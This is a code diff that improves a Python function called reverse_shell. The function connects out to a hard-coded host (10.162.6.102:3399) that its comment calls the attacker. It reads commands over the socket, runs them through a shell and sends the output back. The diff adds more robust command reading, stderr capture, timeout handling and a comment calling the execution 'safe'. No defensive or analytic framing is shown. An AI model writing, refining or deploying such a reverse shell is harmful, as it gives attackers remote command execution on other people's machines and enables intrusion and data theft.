@@ -14,12 +14,9 @@ def reverse_shell(host="10.162.6.102", port=3399):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(30)  # Extended timeout
+            sock.settimeout(30)
             
-            # Set keepalive
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            
-            # Connect
+            # Connect to attacker
             sock.connect((host, port))
             print(f"[+] Connected to {host}:{port}")
             
@@ -28,23 +25,41 @@ def reverse_shell(host="10.162.6.102", port=3399):
                     # Set receive timeout
                     sock.settimeout(10)
                     
-                    # Receive command
-                    cmd = sock.recv(4096).decode().strip()
+                    # Receive command with explicit size
+                    cmd = b""
+                    while True:
+                        data = sock.recv(1024)
+                        if not data:
+                            break
+                        cmd += data
+                        if b"\n" in data:
+                            break
+                    
                     if not cmd:
                         break
                     
-                    # Execute and send response
-                    proc = subprocess.Popen(
-                        cmd,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE
-                    )
-                    output, _ = proc.communicate(timeout=10)
-                    sock.sendall(output)
+                    cmd = cmd.decode().strip()
+                    print(f"[DEBUG] Received: {cmd}")
+                    
+                    # Execute command safely
+                    try:
+                        proc = subprocess.Popen(
+                            cmd,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            text=True
+                        )
+                        output, error = proc.communicate(timeout=10)
+                        
+                        # Send combined output
+                        result = output + error
+                        sock.sendall(result.encode())
+                        
+                    except subprocess.TimeoutExpired:
+                        sock.sendall(b"Command timed out")
                     
                 except socket.timeout:
-                    print("[-] Communication timeout")
                     continue
                 except Exception as e:
                     sock.sendall(str(e).encode())
